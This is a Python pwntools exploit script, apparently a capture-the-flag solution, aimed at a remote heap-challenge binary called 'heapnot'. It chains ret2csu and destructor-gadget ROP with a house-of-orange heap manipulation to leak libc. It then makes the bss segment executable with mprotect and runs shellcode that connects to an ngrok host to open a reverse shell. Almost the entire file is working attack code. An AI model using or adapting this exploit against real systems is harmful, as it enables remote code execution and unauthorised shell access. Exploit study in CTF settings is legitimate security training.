from pwn import *
import time

#init

e = ELF('./heapnot')
libc = ELF('./libc-2.31.so')

context.binary = e

#p = process(e.path)
p = remote('143.198.127.103', 42009)

#funcs

def add(x, y):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', str(y - 1))

def chg(x, s):
    p.sendlineafter('?', '3')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', s)

def regcsu(rbx, rbp, r12, r13, r14, r15): #7 qwords
    rop.call(csu + 82)
    rop.raw(rbx)
    rop.raw(rbp)
    rop.raw(r12)
    rop.raw(r13)
    rop.raw(r14)
    rop.raw(r15)

def ret2csu(call, edi, rsi, rdx): #15 qwords
    regcsu(0x0, 0x1, edi, rsi, rdx, call)
    rop.call(csu + 56)
    for i in range(0x7):
        rop.raw(0x0)

def ret2dtor(x, y): #8 qwords
    if y == 0:
        return
    regcsu(y & 0xffffffff, x + 0x3d, 0x0, 0x0, 0x0, 0x0)
    rop.call(dtor + 24)

#vars

csu = e.sym['__libc_csu_init']
dtor = e.sym['__do_global_dtors_aux']
arr = e.sym['not']
arena_off = 0x1bebe0
mprotect_off = libc.sym['mprotect']

shellcode = shellcraft.open('/dev/pts/0')
shellcode += shellcraft.connect('8.tcp.ngrok.io', 12364)
shellcode += shellcraft.findpeersh(12364)

log.info('Csu adr: ' + hex(csu))
log.info('Dtor adr: ' + hex(dtor))
log.info('Arr adr: ' + hex(arr))
log.info('Arena libc off: ' + hex(arena_off))
log.info('Mprotect libc off: ' + hex(mprotect_off))
print("")
#log.info('Shellcode:\n' + shellcode)
log.info('Shellcode len: ' + hex(len(asm(shellcode))))

#exploit

#malloc to put heap addresses on bss for rop chain and sizes to set up house of orange, also put debug marker

add(2, 0x18)
add(13, 0x18)
add(25, 0x3f8 - 2 * 0x20)

chg(2, 'debug heap')

#first make 2nd rop
#it will first perform house of orange using the heap addresses contained on the stack to leak libc on heap
#then it will ret2csu mprotect bss to make executable then ret2csu run shellcode with reverse tcp shell

rop = ROP(e)
ret2dtor(0x3f8, -0x1f000) #uses heap adr 1, chg top chnk size
rop.malloc(0x1008) #3 qwords
ret2dtor(0x3f8 - 0x20 + 0x8, mprotect_off - arena_off) #uses heap adr 2, chg libc ptr to point to protect
ret2csu(0x3f8 - 2 * 0x20 + 0x8, arr ^ (arr & 0xfff), 0x1000, 0x7) #uses heap adr 3, calls mprotect
ret2csu(arr + len(rop.chain()) + 15 * 0x8, 0x0, 0x0, 0x0) #call shellcode
rop.raw(arr + len(rop.chain()) + 0x8) #shellcode ptr

#log.info('Rop 2:\n' + rop.dump())
log.info('Rop 2 len: ' + hex(len(rop.dump())))

s = rop.chain() + asm(shellcode)
s += b'\x00' * (4 - len(s) % 4)

#now write 1st rop
#it uses dtor gadget to write the 2nd rop onto bss segment overlapping with heap addresses put initially
#after it pivots to call 2nd rop

rop = ROP(e)

for i in range(0, len(s) - 0x4, 4):
    ret2dtor(arr + i, u32(s[i:i + 0x4])) #write 2nd rop

rop.migrate(arr) #call 2nd rop

#log.info('Rop 1:\n' + rop.dump())
log.info('Rop 1 len: ' + hex(len(rop.dump())))

s = b'5'
s = s.ljust(0x38, b'\x00')
s += rop.chain()

p.sendlineafter('?', s)

#pray for flag

p.interactive()
